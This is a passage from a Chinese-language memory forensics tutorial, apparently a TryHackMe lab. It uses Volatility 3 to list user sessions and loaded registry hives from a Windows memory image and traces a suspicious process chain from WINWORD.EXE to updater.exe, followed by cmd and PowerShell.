style="color:#393A34"><span class="token plain">    HFDI      hfdi</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ERF       erf</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cFiles</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbTotalBytes</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PERROR    perr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SPILLERR  se</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSpill</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achSelf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achMsg</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbMAX_LINE</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achLine</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achLocation</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achFile</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achDest</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achCabPath</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fContinuationCabinet</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fShowReserveInfo</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fNextCabCalled</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    CABINET   acab</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achZap</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      achCabinetFile</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cbFILE_NAME_MAX</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       cArgv</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">pArgv</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       fDestructive</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    USHORT    iCurrentFolder</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SESSION</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">PSESSION</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Windows<strong>会话</strong>插件（<strong>windows.session</strong>）遍历这些内核和用户会话管理结构，以提取会话ID、用户SID、登录类型（例如控制台、RDP）和登录时间戳等详细信息。 这些值存储在csrss.exe、winlogon.exe以及其他与交互式会话相关的系统进程的内存中。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="已登录会话">已登录会话<a href="#已登录会话" class="hash-link" aria-label="已登录会话的直接链接" title="已登录会话的直接链接" translate="no">​</a></h3>
<p>我们可以使用Volatility探索会话。 让我们运行命令<code>vol -f THM-WIN-001_071528_07052025.mem windows.sessions &gt; sessions.txt</code>，将输出保存到文件<code>sessions.txt</code>以供进一步分析。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme</span><span class="token variable" style="color:#36acaa">$vol</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> THM-WIN-001_071528_07052025.mem windows.sessions </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> sessions.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> sessions.txt </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Session ID  Session Type  Process ID  Process Name        User Name                         Create Time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------  ------------- ----------- ------------------- --------------------------------  -------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">           System              -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:48.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">92</span><span class="token plain">          Registry            -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:44.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">324</span><span class="token plain">         smss.exe            -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:48.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">9264</span><span class="token plain">        msedge.exe          -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:11.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">10100</span><span class="token plain">       SystemSettings      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">6836</span><span class="token plain">        ApplicationFra      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">8408</span><span class="token plain">        UserOOBEBroker      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:09:45.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">3276</span><span class="token plain">        svchost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:10:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7376</span><span class="token plain">        TextInputHost.      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:11:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7468</span><span class="token plain">        dllhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:11:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">5952</span><span class="token plain">        cmd.exe             </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:43.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3144</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:43.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">828</span><span class="token plain">         ShellExperienc      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">3548</span><span class="token plain">        RuntimeBroker.      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:12:51.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">        WINWORD.EXE         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:04.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3392</span><span class="token plain">        pdfupdater.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">3932</span><span class="token plain">        ai.exe              </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">2576</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">10084</span><span class="token plain">       windows-update      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:05.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">10032</span><span class="token plain">       updater.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:13:56.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">432</span><span class="token plain">         cmd.exe             </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">4592</span><span class="token plain">        conhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:36.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">6984</span><span class="token plain">        powershell.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:14:39.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">2572</span><span class="token plain">        SearchProtocol      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:23.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           -             </span><span class="token number" style="color:#36acaa">7788</span><span class="token plain">        FTK Imager.exe      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:28.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">           Console       </span><span class="token number" style="color:#36acaa">9920</span><span class="token plain">        dllhost.exe         </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">redacted</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:15:42.000000 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">N/A         -             </span><span class="token number" style="color:#36acaa">1884</span><span class="token plain">        MemCompression      -                                 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-05-07 07:08:49.000000 UTC</span><br></span></code></pre></div></div>
<p><strong>注意</strong>：首次运行Volatility时，启动需要几分钟</p>
<p>操作员用户会话（会话<strong>ID 1</strong>）因一系列明显的可疑操作而显得突出。 在几秒钟内，该用户下启动了一系列进程，指向主动参与而非后台任务。 时间线和一致的用户上下文表明会话被入侵，随后被攻击者使用。</p>
<ul>
<li class="">可疑会话：与用户操作员相关的活动，会话<strong>ID 1</strong>。</li>
<li class="">恶意进程链：<strong>WINWORD.EXE</strong> → <strong>pdfupdater.exe</strong> → <strong>windows-update.exe</strong> → <strong>updater.exe</strong>。</li>
<li class="">所有进程都在同一交互式会话下执行。</li>
<li class="">后利用行为：cmd.exe（<strong>PID 432</strong>）和powershell.exe（<strong>PID 6984</strong>）出现在<strong>updater.exe</strong>之后。</li>
<li class="">攻击者可能获得控制权并开始发出命令。</li>
<li class="">证据指向在初始访问后被利用的劫持用户会话。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="查找已加载的注册表配置单元">查找已加载的注册表配置单元<a href="#查找已加载的注册表配置单元" class="hash-link" aria-label="查找已加载的注册表配置单元的直接链接" title="查找已加载的注册表配置单元的直接链接" translate="no">​</a></h3>
<p>另一个需要检查的重要工件是<a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry" target="_blank" rel="noopener noreferrer" class="">Windows注册表</a>，它保存了广泛的用户和系统配置数据，包括最近使用的文件、执行的程序、无线连接等详细信息。 当注册表配置单元（如<strong>NTUSER.DAT</strong>或<strong>SYSTEM</strong>）加载到内存中时，意味着用户处于活动状态并与系统交互。 通过识别在获取时内存中存在哪些注册表配置单元，我们可以将特定的用户行为与特定账户关联起来。</p>
<p>Volatility通过扫描内存中的<strong>CMHIVE</strong>内核结构实例来定位已加载的注册表配置单元（此结构未公开文档，但我们可以在<a href="https://www.nirsoft.net/kernel_struct/vista/CMHIVE.html" target="_blank" rel="noopener noreferrer" class="">此处</a>找到一些相关信息）。 这些配置单元通常在启动或用户登录期间由Windows内核加载到内存中。 <strong>windows.registry.hivelist</strong>插件遍历内核的HiveList。 每个条目包含配置单元的虚拟内存地址以及其在磁盘上的原始存储路径（例如，<strong>C:\Users\&lt;USERNAME&gt;\NTUSER.DAT</strong>）。</p>
<p>让我们使用命令<code>vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist &gt; hivelist.txt</code>来检查并将输出保存到文件hivelist.txt，并分析输出：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ vol </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> THM-WIN-001_071528_07052025.mem windows.registry.hivelist </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> hivelist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> hivelist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Offset              FileFullPath                                                                                                                                            File output</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c63e66000                                                                                                                                                              Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c63e7d000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">REGISTRY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM                                                                                                                                Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6867b000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ServiceProfiles</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">NetworkService</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Local</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">DeliveryOptimization</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">State</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">dosvcState.dat                                 Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6878d000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat                                                                                                                        Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c68796000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Local</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsrClass.dat                                                                                      Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c69c6c000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppCompat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Programs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Amcache.hve                                                                                                           Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6a63a000      </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppRepository</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Packages</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">MicrosoftWindows.Client.CBS_1000.19061.1000.0_x64__cw5n1h2txyewy</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ActivationStore.dat        Disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p>如上输出所示，我们可以确认用户操作员的注册表配置单元在获取内存转储时已完全加载到内存中，包括主要的<strong>ntuser.dat</strong>文件以及<strong>UsrClass.dat</strong>下的相关用户特定应用程序设置。 这强烈表明操作员账户不仅已登录，而且正在主动与系统交互，但并未显示任何潜在的交互发生。</p>
<p>来自<code>AppData\Local\Packages</code>路径的几个注册表条目显示访问或配置了现代Windows UWP应用程序的痕迹，例如<strong>StartMenuExperienceHost</strong>、<strong>Search</strong>、<strong>ShellExperienceHost</strong>和<strong>LockApp</strong>，所有这些都与用户<strong>操作员</strong>相关联。 这些用户配置单元在内存中的存在支持了活动进程树引起的怀疑，特别是因为此用户与涉及<strong>WINWORD.EXE</strong>、pdfupdater.exe以及可能的后期利用阶段的可疑进程相关。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="图形界面活动">图形界面活动<a href="#图形界面活动" class="hash-link" aria-label="图形界面活动的直接链接" title="图形界面活动的直接链接" translate="no">​</a></h3>
<p><a href="https://www.magnetforensics.com/blog/artifact-profile-userassist/" target="_blank" rel="noopener noreferrer" class=""><strong>UserAssist</strong></a>，一个未公开文档的注册表，用于追踪用户通过图形界面启动的可执行文件，帮助我们了解用户通过图形界面与哪些程序交互。 它追踪从<strong>开始菜单</strong>、<strong>桌面</strong>或<strong>资源管理器</strong>启动的应用程序，包括<strong>cmd.exe</strong>、<strong>powershell.exe</strong>和自定义可执行文件等工具。 我们可以使用此信息来确定用户实际运行了什么，即使执行的证据已从磁盘或事件日志中消失。 在入侵前不久在<strong>UserAssist</strong>中看到类似<strong>powershell.exe</strong>或<strong>regsvr32.exe</strong>的内容可以表明直接的用户驱动活动，这在尝试确定意图并将操作追踪到特定账户时至关重要。 这种技术被<strong>Raspberry Robin蠕虫</strong>等威胁行为者在实际攻击中使用。</p>
<p>Volatility中的<strong>windows.registry.userassist</strong>插件从<strong>NTUSER.DAT</strong>配置单元读取，这是一个Windows注册表配置单元文件，存储用户的设置和偏好，特别是在<strong>Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</strong>键下。 每个条目都是<strong>ROT13编码的</strong>，并包含应用程序路径、运行计数器和上次启动时间戳等详细信息。</p>
<p>让我们执行命令<code>vol -f THM-WIN-001_071528_07052025.mem windows.registry.userassist &gt; userassist.txt</code>，并通过<code>cat userassist.txt</code>查看输出来进行调查</p>
